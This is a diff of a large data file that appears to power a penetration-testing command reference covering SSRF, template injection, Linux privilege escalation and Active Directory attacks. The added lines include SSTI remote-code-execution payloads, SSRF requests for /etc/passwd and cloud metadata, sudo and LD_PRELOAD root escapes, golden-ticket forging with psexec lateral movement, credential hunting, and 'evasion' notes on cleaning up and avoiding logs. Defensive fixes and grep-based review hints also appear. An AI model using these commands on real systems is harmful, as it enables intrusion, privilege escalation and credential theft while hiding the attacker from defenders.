         "vulnerable_config": "# PHP — vulnerable SSRF pattern (user URL passed directly to curl):\n<?php\n$url = $_GET['url'];          // e.g. ?url=http://169.254.169.254/latest/meta-data/\n$ch = curl_init($url);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n$result = curl_exec($ch);     // fetches internal AWS metadata, Redis, etc.\necho $result;\n?>\n\n# Also vulnerable: XML parsers without external entity restrictions (XXE-based SSRF)\n# JAVA Spring — @RequestParam url passed to RestTemplate without validation",
-        "secure_config": "# PHP — allowlist-based fix:\n<?php\n$url = $_GET['url'];\n$parsed = parse_url($url);\n// Allowlist of permitted hosts only:\n$allowed_hosts = ['cdn.example.com', 'api.partner.com'];\nif (!in_array($parsed['host'], $allowed_hosts)) {\n    http_response_code(400);\n    die('URL not allowed');\n}\n// Also block private/loopback IPs after DNS resolution:\n$ip = gethostbyname($parsed['host']);\nif (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {\n    die('Private IP ranges not allowed');\n}\n$ch = curl_init($url);\n// Disable redirects to prevent redirect-based bypass:\ncurl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);\n?>\n\n# Infrastructure layer:\n# Block EC2 metadata IP 169.254.169.254 at egress firewall\n# Deploy IMDSv2 on AWS (requires session token, blocks simple GET SSRF)"
+        "secure_config": "# PHP — allowlist-based fix:\n<?php\n$url = $_GET['url'];\n$parsed = parse_url($url);\n// Allowlist of permitted hosts only:\n$allowed_hosts = ['cdn.example.com', 'api.partner.com'];\nif (!in_array($parsed['host'], $allowed_hosts)) {\n    http_response_code(400);\n    die('URL not allowed');\n}\n// Also block private/loopback IPs after DNS resolution:\n$ip = gethostbyname($parsed['host']);\nif (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {\n    die('Private IP ranges not allowed');\n}\n$ch = curl_init($url);\n// Disable redirects to prevent redirect-based bypass:\ncurl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);\n?>\n\n# Infrastructure layer:\n# Block EC2 metadata IP 169.254.169.254 at egress firewall\n# Deploy IMDSv2 on AWS (requires session token, blocks simple GET SSRF)",
+        "code_review": "RED FLAGS (source): server fetches a user-supplied URL/host.\n  curl_exec on $_GET['url']  |  file_get_contents($url)  |  requests.get(user_url)  |  fetch(req.query.url)  |  new URL(input)\nGREP:  grep -rniE \"curl_(init|exec|setopt)|file_get_contents\\(.*(http|\\$)|requests\\.(get|post)\\(|urllib|fetch\\(|HttpClient\" .\nSAFE:  allowlist destinations, block RFC1918 + link-local 169.254.169.254 (cloud metadata), deny redirects, resolve+validate host, no raw user URLs."
       }
     },
     {
@@ -70220,12 +73880,12 @@ const COMMAND_DATA = {
         {
           "command": "curl -s -X PATCH http://<target>/api/v1/<endpoint> -H \"Authorization: Bearer <jwt_token>\" -H \"Content-Type: application/json\" -d '{\"id\": \"<object_id>\", \"<uri_field>\": \"file:///etc/passwd\"}' | jq",
           "caption": "API SSRF: inject file:// URI into JSON property that server fetches",
-          "label": "PATCH request"
+          "label": "PATCH - file:// local file read"
         },
         {
           "command": "curl -s -X PATCH http://<target>/api/v1/<endpoint> -H \"Authorization: Bearer <jwt_token>\" -H \"Content-Type: application/json\" -d '{\"id\": \"<object_id>\", \"<uri_field>\": \"http://169.254.169.254/latest/meta-data/\"}' | jq",
           "caption": "API SSRF via JSON property: cloud metadata endpoint",
-          "label": "PATCH request"
+          "label": "PATCH - cloud metadata (169.254.169.254)"
         },
         {
           "command": "curl -s -X GET http://<target>/api/v1/<endpoint>/<object_id>/document -H \"Authorization: Bearer <jwt_token>\"",
@@ -70248,7 +73908,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "The application accepts user-controlled URLs or hostnames and makes server-side HTTP requests without validating the destination. Common patterns: image preview from a URL, webhook configuration, PDF generator, document parser (XML with XXE), or any 'fetch this URL' feature. The server's outbound requests can reach internal services (metadata APIs, Redis, Elasticsearch, internal admin panels) that are not exposed externally.",
         "vulnerable_config": "# PHP — vulnerable SSRF pattern (user URL passed directly to curl):\n<?php\n$url = $_GET['url'];          // e.g. ?url=http://169.254.169.254/latest/meta-data/\n$ch = curl_init($url);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n$result = curl_exec($ch);     // fetches internal AWS metadata, Redis, etc.\necho $result;\n?>\n\n# Also vulnerable: XML parsers without external entity restrictions (XXE-based SSRF)\n# JAVA Spring — @RequestParam url passed to RestTemplate without validation",
-        "secure_config": "# PHP — allowlist-based fix:\n<?php\n$url = $_GET['url'];\n$parsed = parse_url($url);\n// Allowlist of permitted hosts only:\n$allowed_hosts = ['cdn.example.com', 'api.partner.com'];\nif (!in_array($parsed['host'], $allowed_hosts)) {\n    http_response_code(400);\n    die('URL not allowed');\n}\n// Also block private/loopback IPs after DNS resolution:\n$ip = gethostbyname($parsed['host']);\nif (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {\n    die('Private IP ranges not allowed');\n}\n$ch = curl_init($url);\n// Disable redirects to prevent redirect-based bypass:\ncurl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);\n?>\n\n# Infrastructure layer:\n# Block EC2 metadata IP 169.254.169.254 at egress firewall\n# Deploy IMDSv2 on AWS (requires session token, blocks simple GET SSRF)"
+        "secure_config": "# PHP — allowlist-based fix:\n<?php\n$url = $_GET['url'];\n$parsed = parse_url($url);\n// Allowlist of permitted hosts only:\n$allowed_hosts = ['cdn.example.com', 'api.partner.com'];\nif (!in_array($parsed['host'], $allowed_hosts)) {\n    http_response_code(400);\n    die('URL not allowed');\n}\n// Also block private/loopback IPs after DNS resolution:\n$ip = gethostbyname($parsed['host']);\nif (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {\n    die('Private IP ranges not allowed');\n}\n$ch = curl_init($url);\n// Disable redirects to prevent redirect-based bypass:\ncurl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);\n?>\n\n# Infrastructure layer:\n# Block EC2 metadata IP 169.254.169.254 at egress firewall\n# Deploy IMDSv2 on AWS (requires session token, blocks simple GET SSRF)",
+        "code_review": "RED FLAGS (source): server fetches a user-supplied URL/host.\n  curl_exec on $_GET['url']  |  file_get_contents($url)  |  requests.get(user_url)  |  fetch(req.query.url)  |  new URL(input)\nGREP:  grep -rniE \"curl_(init|exec|setopt)|file_get_contents\\(.*(http|\\$)|requests\\.(get|post)\\(|urllib|fetch\\(|HttpClient\" .\nSAFE:  allowlist destinations, block RFC1918 + link-local 169.254.169.254 (cloud metadata), deny redirects, resolve+validate host, no raw user URLs."
       }
     },
     {
@@ -70336,7 +73997,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "The application accepts user-controlled URLs or hostnames and makes server-side HTTP requests without validating the destination. Common patterns: image preview from a URL, webhook configuration, PDF generator, document parser (XML with XXE), or any 'fetch this URL' feature. The server's outbound requests can reach internal services (metadata APIs, Redis, Elasticsearch, internal admin panels) that are not exposed externally.",
         "vulnerable_config": "# PHP — vulnerable SSRF pattern (user URL passed directly to curl):\n<?php\n$url = $_GET['url'];          // e.g. ?url=http://169.254.169.254/latest/meta-data/\n$ch = curl_init($url);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n$result = curl_exec($ch);     // fetches internal AWS metadata, Redis, etc.\necho $result;\n?>\n\n# Also vulnerable: XML parsers without external entity restrictions (XXE-based SSRF)\n# JAVA Spring — @RequestParam url passed to RestTemplate without validation",
-        "secure_config": "# PHP — allowlist-based fix:\n<?php\n$url = $_GET['url'];\n$parsed = parse_url($url);\n// Allowlist of permitted hosts only:\n$allowed_hosts = ['cdn.example.com', 'api.partner.com'];\nif (!in_array($parsed['host'], $allowed_hosts)) {\n    http_response_code(400);\n    die('URL not allowed');\n}\n// Also block private/loopback IPs after DNS resolution:\n$ip = gethostbyname($parsed['host']);\nif (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {\n    die('Private IP ranges not allowed');\n}\n$ch = curl_init($url);\n// Disable redirects to prevent redirect-based bypass:\ncurl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);\n?>\n\n# Infrastructure layer:\n# Block EC2 metadata IP 169.254.169.254 at egress firewall\n# Deploy IMDSv2 on AWS (requires session token, blocks simple GET SSRF)"
+        "secure_config": "# PHP — allowlist-based fix:\n<?php\n$url = $_GET['url'];\n$parsed = parse_url($url);\n// Allowlist of permitted hosts only:\n$allowed_hosts = ['cdn.example.com', 'api.partner.com'];\nif (!in_array($parsed['host'], $allowed_hosts)) {\n    http_response_code(400);\n    die('URL not allowed');\n}\n// Also block private/loopback IPs after DNS resolution:\n$ip = gethostbyname($parsed['host']);\nif (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {\n    die('Private IP ranges not allowed');\n}\n$ch = curl_init($url);\n// Disable redirects to prevent redirect-based bypass:\ncurl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);\n?>\n\n# Infrastructure layer:\n# Block EC2 metadata IP 169.254.169.254 at egress firewall\n# Deploy IMDSv2 on AWS (requires session token, blocks simple GET SSRF)",
+        "code_review": "RED FLAGS (source): server fetches a user-supplied URL/host.\n  curl_exec on $_GET['url']  |  file_get_contents($url)  |  requests.get(user_url)  |  fetch(req.query.url)  |  new URL(input)\nGREP:  grep -rniE \"curl_(init|exec|setopt)|file_get_contents\\(.*(http|\\$)|requests\\.(get|post)\\(|urllib|fetch\\(|HttpClient\" .\nSAFE:  allowlist destinations, block RFC1918 + link-local 169.254.169.254 (cloud metadata), deny redirects, resolve+validate host, no raw user URLs."
       }
     },
     {
@@ -70428,8 +74090,33 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "User-controlled input is passed directly into a server-side template engine (Jinja2, Twig, Freemarker, Velocity, Mako, Pebble) for rendering without sanitization or sandboxing. The template engine's expression evaluation is powerful enough to access the Python/Java object model and reach OS execution primitives. This is distinct from XSS (client-side) — SSTI executes on the server.",
         "vulnerable_config": "# Python Flask/Jinja2 — vulnerable pattern:\nfrom flask import Flask, request, render_template_string\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    name = request.args.get('name', 'World')\n    # VULNERABLE: user input directly in template string\n    template = f'Hello {{{{ name }}}}! Welcome to {{{{ name }}}}.'\n    return render_template_string(template)  # Jinja2 evaluates {{ name }}\n    # Payload: ?name={{7*7}} -> renders '49', confirming SSTI\n    # RCE: ?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n\n# PHP Twig — also vulnerable:\n$template = $twig->createTemplate('Hello ' . $_GET['name'] . '!');\necho $template->render([]);",
-        "secure_config": "# Flask/Jinja2 — correct fix: never build template strings from user input\nfrom flask import Flask, request, render_template_string\nfrom markupsafe import escape\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    name = request.args.get('name', 'World')\n    # SAFE: pass as variable, not embedded in template source\n    return render_template_string('Hello {{ name }}!', name=name)\n    # Jinja2 auto-escapes {{ name }} — it cannot execute as code\n\n# If dynamic templates are truly needed, use Jinja2 sandbox:\nfrom jinja2.sandbox import SandboxedEnvironment\nenv = SandboxedEnvironment()\ntemplate = env.from_string(user_provided_template)\nresult = template.render(safe_vars_only)  # blocks dangerous attribute access\n\n# Twig (PHP) — escape user data, never put it in template source:\n$twig->render('template.html.twig', ['name' => $userInput]);  # correct"
-      }
+        "secure_config": "# Flask/Jinja2 — correct fix: never build template strings from user input\nfrom flask import Flask, request, render_template_string\nfrom markupsafe import escape\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    name = request.args.get('name', 'World')\n    # SAFE: pass as variable, not embedded in template source\n    return render_template_string('Hello {{ name }}!', name=name)\n    # Jinja2 auto-escapes {{ name }} — it cannot execute as code\n\n# If dynamic templates are truly needed, use Jinja2 sandbox:\nfrom jinja2.sandbox import SandboxedEnvironment\nenv = SandboxedEnvironment()\ntemplate = env.from_string(user_provided_template)\nresult = template.render(safe_vars_only)  # blocks dangerous attribute access\n\n# Twig (PHP) — escape user data, never put it in template source:\n$twig->render('template.html.twig', ['name' => $userInput]);  # correct",
+        "code_review": "RED FLAGS (source): user input concatenated into the TEMPLATE STRING before render (not passed as data).\n  Jinja: render_template_string(f'...{user}')  |  Twig/Freemarker/Velocity built from request  |  new Template(userInput)\nGREP:  grep -rniE \"render_template_string|Template\\(|createTemplate|\\.render\\(.*(\\+|f\\\"|format)\" .\nSAFE:  pass user input as a context VARIABLE, never build template source from it; run the engine sandboxed."
+      },
+      "variations": [
+        {
+          "label": "Math probe",
+          "command": "{{7*7}}  |  ${7*7}  |  <%= 7*7 %>  |  #{7*7}"
+        },
+        {
+          "label": "Distinguish engine",
+          "command": "{{7*'7'}}   # Jinja2 -> 7777777, Twig -> 49"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Confirm template evaluation",
+          "command": "{{7*7}}"
+        },
+        {
+          "label": "Fingerprint the engine",
+          "command": "{{7*'7'}}   # 49=Twig, 7777777=Jinja2"
+        },
+        {
+          "label": "Escalate to RCE for that engine",
+          "command": "# see ssti-jinja2 / ssti-twig or run sstimap"
+        }
+      ]
     },
     {
       "id": "ssti-jinja2",
@@ -70499,6 +74186,11 @@ const COMMAND_DATA = {
           "id": "sstimap",
           "rel": "alternative",
           "note": "Automate with SSTImap --os-shell."
+        },
+        {
+          "id": "gs-reverse-shells",
+          "rel": "next",
+          "note": "SSTI gives code execution — catch an interactive reverse shell"
         }
       ],
       "references": [
@@ -70526,8 +74218,19 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "User-controlled input is passed directly into a server-side template engine (Jinja2, Twig, Freemarker, Velocity, Mako, Pebble) for rendering without sanitization or sandboxing. The template engine's expression evaluation is powerful enough to access the Python/Java object model and reach OS execution primitives. This is distinct from XSS (client-side) — SSTI executes on the server.",
         "vulnerable_config": "# Python Flask/Jinja2 — vulnerable pattern:\nfrom flask import Flask, request, render_template_string\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    name = request.args.get('name', 'World')\n    # VULNERABLE: user input directly in template string\n    template = f'Hello {{{{ name }}}}! Welcome to {{{{ name }}}}.'\n    return render_template_string(template)  # Jinja2 evaluates {{ name }}\n    # Payload: ?name={{7*7}} -> renders '49', confirming SSTI\n    # RCE: ?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n\n# PHP Twig — also vulnerable:\n$template = $twig->createTemplate('Hello ' . $_GET['name'] . '!');\necho $template->render([]);",
-        "secure_config": "# Flask/Jinja2 — correct fix: never build template strings from user input\nfrom flask import Flask, request, render_template_string\nfrom markupsafe import escape\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    name = request.args.get('name', 'World')\n    # SAFE: pass as variable, not embedded in template source\n    return render_template_string('Hello {{ name }}!', name=name)\n    # Jinja2 auto-escapes {{ name }} — it cannot execute as code\n\n# If dynamic templates are truly needed, use Jinja2 sandbox:\nfrom jinja2.sandbox import SandboxedEnvironment\nenv = SandboxedEnvironment()\ntemplate = env.from_string(user_provided_template)\nresult = template.render(safe_vars_only)  # blocks dangerous attribute access\n\n# Twig (PHP) — escape user data, never put it in template source:\n$twig->render('template.html.twig', ['name' => $userInput]);  # correct"
-      }
+        "secure_config": "# Flask/Jinja2 — correct fix: never build template strings from user input\nfrom flask import Flask, request, render_template_string\nfrom markupsafe import escape\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    name = request.args.get('name', 'World')\n    # SAFE: pass as variable, not embedded in template source\n    return render_template_string('Hello {{ name }}!', name=name)\n    # Jinja2 auto-escapes {{ name }} — it cannot execute as code\n\n# If dynamic templates are truly needed, use Jinja2 sandbox:\nfrom jinja2.sandbox import SandboxedEnvironment\nenv = SandboxedEnvironment()\ntemplate = env.from_string(user_provided_template)\nresult = template.render(safe_vars_only)  # blocks dangerous attribute access\n\n# Twig (PHP) — escape user data, never put it in template source:\n$twig->render('template.html.twig', ['name' => $userInput]);  # correct",
+        "code_review": "RED FLAGS (source): user input concatenated into the TEMPLATE STRING before render (not passed as data).\n  Jinja: render_template_string(f'...{user}')  |  Twig/Freemarker/Velocity built from request  |  new Template(userInput)\nGREP:  grep -rniE \"render_template_string|Template\\(|createTemplate|\\.render\\(.*(\\+|f\\\"|format)\" .\nSAFE:  pass user input as a context VARIABLE, never build template source from it; run the engine sandboxed."
+      },
+      "variations": [
+        {
+          "label": "popen one-liner",
+          "command": "{{ cycler.__init__.__globals__.os.popen('id').read() }}"
+        },
+        {
+          "label": "config leak",
+          "command": "{{ config.items() }}"
+        }
+      ]
     },
     {
       "id": "ssti-twig",
@@ -70597,6 +74300,11 @@ const COMMAND_DATA = {
           "id": "sstimap",
           "rel": "alternative",
           "note": "Automate with SSTImap --os-shell."
+        },
+        {
+          "id": "gs-reverse-shells",
+          "rel": "next",
+          "note": "SSTI gives code execution — catch an interactive reverse shell"
         }
       ],
       "references": [
@@ -70624,8 +74332,15 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "User-controlled input is passed directly into a server-side template engine (Jinja2, Twig, Freemarker, Velocity, Mako, Pebble) for rendering without sanitization or sandboxing. The template engine's expression evaluation is powerful enough to access the Python/Java object model and reach OS execution primitives. This is distinct from XSS (client-side) — SSTI executes on the server.",
         "vulnerable_config": "# Python Flask/Jinja2 — vulnerable pattern:\nfrom flask import Flask, request, render_template_string\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    name = request.args.get('name', 'World')\n    # VULNERABLE: user input directly in template string\n    template = f'Hello {{{{ name }}}}! Welcome to {{{{ name }}}}.'\n    return render_template_string(template)  # Jinja2 evaluates {{ name }}\n    # Payload: ?name={{7*7}} -> renders '49', confirming SSTI\n    # RCE: ?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n\n# PHP Twig — also vulnerable:\n$template = $twig->createTemplate('Hello ' . $_GET['name'] . '!');\necho $template->render([]);",
-        "secure_config": "# Flask/Jinja2 — correct fix: never build template strings from user input\nfrom flask import Flask, request, render_template_string\nfrom markupsafe import escape\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    name = request.args.get('name', 'World')\n    # SAFE: pass as variable, not embedded in template source\n    return render_template_string('Hello {{ name }}!', name=name)\n    # Jinja2 auto-escapes {{ name }} — it cannot execute as code\n\n# If dynamic templates are truly needed, use Jinja2 sandbox:\nfrom jinja2.sandbox import SandboxedEnvironment\nenv = SandboxedEnvironment()\ntemplate = env.from_string(user_provided_template)\nresult = template.render(safe_vars_only)  # blocks dangerous attribute access\n\n# Twig (PHP) — escape user data, never put it in template source:\n$twig->render('template.html.twig', ['name' => $userInput]);  # correct"
-      }
+        "secure_config": "# Flask/Jinja2 — correct fix: never build template strings from user input\nfrom flask import Flask, request, render_template_string\nfrom markupsafe import escape\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    name = request.args.get('name', 'World')\n    # SAFE: pass as variable, not embedded in template source\n    return render_template_string('Hello {{ name }}!', name=name)\n    # Jinja2 auto-escapes {{ name }} — it cannot execute as code\n\n# If dynamic templates are truly needed, use Jinja2 sandbox:\nfrom jinja2.sandbox import SandboxedEnvironment\nenv = SandboxedEnvironment()\ntemplate = env.from_string(user_provided_template)\nresult = template.render(safe_vars_only)  # blocks dangerous attribute access\n\n# Twig (PHP) — escape user data, never put it in template source:\n$twig->render('template.html.twig', ['name' => $userInput]);  # correct",
+        "code_review": "RED FLAGS (source): user input concatenated into the TEMPLATE STRING before render (not passed as data).\n  Jinja: render_template_string(f'...{user}')  |  Twig/Freemarker/Velocity built from request  |  new Template(userInput)\nGREP:  grep -rniE \"render_template_string|Template\\(|createTemplate|\\.render\\(.*(\\+|f\\\"|format)\" .\nSAFE:  pass user input as a context VARIABLE, never build template source from it; run the engine sandboxed."
+      },
+      "variations": [
+        {
+          "label": "registered function",
+          "command": "{{ _self.env.registerUndefinedFilterCallback('system') }}{{ _self.env.getFilter('id') }}"
+        }
+      ]
     },
     {
       "id": "sstimap",
@@ -70699,6 +74414,11 @@ const COMMAND_DATA = {
           "id": "ssti-twig",
           "rel": "alternative",
           "note": "Manual Twig payloads if SSTImap is blocked."
+        },
+        {
+          "id": "gs-reverse-shells",
+          "rel": "next",
+          "note": "Use the confirmed SSTI RCE to catch a reverse shell"
         }
       ],
       "references": [
@@ -70725,7 +74445,8 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "User-controlled input is passed directly into a server-side template engine (Jinja2, Twig, Freemarker, Velocity, Mako, Pebble) for rendering without sanitization or sandboxing. The template engine's expression evaluation is powerful enough to access the Python/Java object model and reach OS execution primitives. This is distinct from XSS (client-side) — SSTI executes on the server.",
         "vulnerable_config": "# Python Flask/Jinja2 — vulnerable pattern:\nfrom flask import Flask, request, render_template_string\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    name = request.args.get('name', 'World')\n    # VULNERABLE: user input directly in template string\n    template = f'Hello {{{{ name }}}}! Welcome to {{{{ name }}}}.'\n    return render_template_string(template)  # Jinja2 evaluates {{ name }}\n    # Payload: ?name={{7*7}} -> renders '49', confirming SSTI\n    # RCE: ?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n\n# PHP Twig — also vulnerable:\n$template = $twig->createTemplate('Hello ' . $_GET['name'] . '!');\necho $template->render([]);",
-        "secure_config": "# Flask/Jinja2 — correct fix: never build template strings from user input\nfrom flask import Flask, request, render_template_string\nfrom markupsafe import escape\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    name = request.args.get('name', 'World')\n    # SAFE: pass as variable, not embedded in template source\n    return render_template_string('Hello {{ name }}!', name=name)\n    # Jinja2 auto-escapes {{ name }} — it cannot execute as code\n\n# If dynamic templates are truly needed, use Jinja2 sandbox:\nfrom jinja2.sandbox import SandboxedEnvironment\nenv = SandboxedEnvironment()\ntemplate = env.from_string(user_provided_template)\nresult = template.render(safe_vars_only)  # blocks dangerous attribute access\n\n# Twig (PHP) — escape user data, never put it in template source:\n$twig->render('template.html.twig', ['name' => $userInput]);  # correct"
+        "secure_config": "# Flask/Jinja2 — correct fix: never build template strings from user input\nfrom flask import Flask, request, render_template_string\nfrom markupsafe import escape\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    name = request.args.get('name', 'World')\n    # SAFE: pass as variable, not embedded in template source\n    return render_template_string('Hello {{ name }}!', name=name)\n    # Jinja2 auto-escapes {{ name }} — it cannot execute as code\n\n# If dynamic templates are truly needed, use Jinja2 sandbox:\nfrom jinja2.sandbox import SandboxedEnvironment\nenv = SandboxedEnvironment()\ntemplate = env.from_string(user_provided_template)\nresult = template.render(safe_vars_only)  # blocks dangerous attribute access\n\n# Twig (PHP) — escape user data, never put it in template source:\n$twig->render('template.html.twig', ['name' => $userInput]);  # correct",
+        "code_review": "RED FLAGS (source): user input concatenated into the TEMPLATE STRING before render (not passed as data).\n  Jinja: render_template_string(f'...{user}')  |  Twig/Freemarker/Velocity built from request  |  new Template(userInput)\nGREP:  grep -rniE \"render_template_string|Template\\(|createTemplate|\\.render\\(.*(\\+|f\\\"|format)\" .\nSAFE:  pass user input as a context VARIABLE, never build template source from it; run the engine sandboxed."
       }
     },
     {
@@ -71209,7 +74930,7 @@ const COMMAND_DATA = {
         },
         {
           "description": "dnsenum with XML output (for later parsing)",
-          "command": "dnsenum --enum <domain> -f <wordlist> -o <output.xml> -r",
+          "command": "dnsenum --enum <domain> -f <wordlist> -o <outfile> -r",
           "label": "XML output"
         },
         {
@@ -71329,7 +75050,8 @@ const COMMAND_DATA = {
           "HTB M25",
           "MITRE T1068",
           "OWASP A06:2021"
-        ]
+        ],
+        "evasion": "Use the GTFOBins one-shot that spawns a shell without writing files; remove any dropped .so/binary; the sudo call is logged, so do it once and pivot rather than repeating."
       }
     },
     {
@@ -71416,7 +75138,8 @@ const COMMAND_DATA = {
         "sources": [
           "HTB M25",
           "MITRE T1548.003"
-        ]
+        ],
+        "evasion": "Use the GTFOBins one-shot that spawns a shell without writing files; remove any dropped .so/binary; the sudo call is logged, so do it once and pivot rather than repeating."
       }
     },
     {
@@ -71510,8 +75233,29 @@ const COMMAND_DATA = {
           "HTB M25",
           "MITRE T1548.003",
           "MITRE T1059"
-        ]
-      }
+        ],
+        "evasion": "Use the GTFOBins one-shot that spawns a shell without writing files; remove any dropped .so/binary; the sudo call is logged, so do it once and pivot rather than repeating."
+      },
+      "variations": [
+        {
+          "label": "GTFOBins lookup for an allowed binary",
+          "command": "# https://gtfobins.github.io/#+sudo  -> find the escape for the binary in sudo -l"
+        },
+        {
+          "label": "Preserve-env / LD_PRELOAD",
+          "command": "sudo LD_PRELOAD=/tmp/shell.so <allowed_binary>"
+        }
+      ],
+      "steps": [
+        {
+          "label": "List what you can run as sudo",
+          "command": "sudo -l"
+        },
+        {
+          "label": "Abuse an allowed binary to get a root shell",
+          "command": "# e.g. sudo vim -c ':!/bin/sh'  |  sudo less /etc/profile then !/bin/sh"
+        }
+      ]
     },
     {
       "type": "command",
@@ -71626,8 +75370,15 @@ const COMMAND_DATA = {
         "sources": [
           "HTB M25",
           "MITRE T1548.003"
-        ]
-      }
+        ],
+        "evasion": "Use the GTFOBins one-shot that spawns a shell without writing files; remove any dropped .so/binary; the sudo call is logged, so do it once and pivot rather than repeating."
+      },
+      "variations": [
+        {
+          "label": "Run a command via -z postrotate",
+          "command": "sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/root.sh -Z root"
+        }
+      ]
     },
     {
       "type": "command",
@@ -71707,10 +75458,6 @@ const COMMAND_DATA = {
       "description": "Find root-owned SUID/SGID binaries, then check GTFOBins for an escalation technique (e.g. apt-get's Pre-Invoke shell escape).",
       "variations": [
         {
-          "label": "SUID (-4000)",
-          "command": "find / -user root -perm -4000 -exec ls -ldb {} \\; 2>/dev/null"
-        },
-        {
           "label": "SGID (-6000)",
           "command": "find / -uid 0 -perm -6000 -type f 2>/dev/null\nfind / -user root -perm -6000 -exec ls -ldb {} \\; 2>/dev/null"
         }
@@ -71733,7 +75480,8 @@ const COMMAND_DATA = {
         "sources": [
           "HTB M25",
           "MITRE T1548.001"
-        ]
+        ],
+        "evasion": "Use the GTFOBins invocation that runs in-place without dropping files; clean up any temporary payloads; a single setuid abuse is quieter than repeated attempts."
       }
     },
     {
@@ -72323,6 +76071,12 @@ const COMMAND_DATA = {
       },
       "tools": [
         "powershell"
+      ],
+      "variations": [
+        {
+          "label": "Grep logon scripts for creds",
+          "command": "findstr /S /I /C:\"password\" \\\\<dc_host>\\SYSVOL\\<domain>\\scripts\\*"
+        }
       ]
     },
     {
@@ -72431,7 +76185,13 @@ const COMMAND_DATA = {
         "misconfiguration": "Non-admin groups have GenericWrite ACEs on user objects (from legacy delegation, help desk roles). No monitoring of SPN changes on user accounts. Sensitive accounts have weak passwords.",
         "vulnerable_config": "# GenericWrite on DA account by HelpDesk:\nGet-ObjectAcl 'DAUser1' -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'GenericWrite' -and $_.IdentityReference -match 'HelpDesk'}\n# HelpDesk has GenericWrite → can set SPN → targeted Kerberoast\n\n# Set fake SPN on target (requires GenericWrite):\nSet-DomainObject -Identity DAUser1 -Set @{serviceprincipalname='fake/dc01'}\n# Then: Rubeus.exe kerberoast /user:DAUser1 /outfile:hash.txt",
         "secure_config": "# Remove GenericWrite ACEs via AD ACL cleanup:\nRemove-ADPermission -Identity 'DAUser1' -User 'HelpDesk' -AccessRights WriteProperty -Properties 'servicePrincipalName'\n\n# Monitor SPN changes via Event 4738:\n# SIEM: EventID=4738 AND ChangedAttributes contains 'ServicePrincipalName' AND\n# TargetUserName NOT IN (known service accounts) → ALERT: possible targeted Kerberoasting\n\n# Force AES-only on sensitive accounts:\nSet-ADUser DAUser1 -KerberosEncryptionType AES256\n# msDS-SupportedEncryptionTypes = 16 (AES256 only) → RC4 TGS not issuable"
-      }
+      },
+      "variations": [
+        {
+          "label": "Crack the targeted hash (John)",
+          "command": "john.exe --wordlist=<wordlist> <hashfile>"
+        }
+      ]
     },
     {
       "id": "cdsa-m08-tcp-abnormalities",
@@ -72867,7 +76627,8 @@ const COMMAND_DATA = {
           "MITRE T1190",
           "MITRE T1083",
           "OWASP A03:2021"
-        ]
+        ],
+        "evasion": "Analyze the client offline (decompile/traffic capture) so no attack traffic hits the server until you have the exploit ready."
       }
     },
     {
@@ -72961,7 +76722,8 @@ const COMMAND_DATA = {
           "MITRE T1552",
           "MITRE T1552.001",
           "OWASP A02:2021"
-        ]
+        ],
+        "evasion": "Analyze the client offline (decompile/traffic capture) so no attack traffic hits the server until you have the exploit ready."
       }
     },
     {
@@ -73120,6 +76882,26 @@ const COMMAND_DATA = {
       },
       "tools": [
         "impacket"
+      ],
+      "variations": [
+        {
+          "label": "AES key instead of RC4",
+          "command": "ticketer.py -aesKey <child_krbtgt_aes> -domain <child_domain> -domain-sid <child_sid> -extra-sid <parent_ea_sid> -user-id 500 Administrator"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Forge golden ticket with extra EA SID",
+          "command": "ticketer.py -nthash <child_krbtgt_hash> -domain <child_domain> -domain-sid <child_sid> -extra-sid <parent_ea_sid> Administrator"
+        },
+        {
+          "label": "Load the ccache",
+          "command": "export KRB5CCNAME=Administrator.ccache"
+        },
+        {
+          "label": "Access the parent DC",
+          "command": "psexec.py -k -no-pass <child_domain>/Administrator@<parent_dc_fqdn>"
+        }
       ]
     },
     {
